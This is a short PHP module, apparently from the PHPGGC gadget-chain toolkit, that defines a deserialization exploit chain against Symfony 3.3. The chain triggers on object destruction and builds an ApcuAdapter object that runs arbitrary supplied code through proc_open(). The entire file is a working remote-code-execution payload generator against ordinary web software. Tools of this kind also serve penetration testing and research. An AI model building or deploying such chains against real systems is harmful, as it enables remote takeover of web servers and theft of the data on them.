<?php

namespace GadgetChain\Symfony;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '3.3';
    public $vector = '__destruct';
    public $author = 'cf';
    public $informations = 'Executes through proc_open()';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \Symfony\Component\Cache\Adapter\ApcuAdapter($code);
    }
}
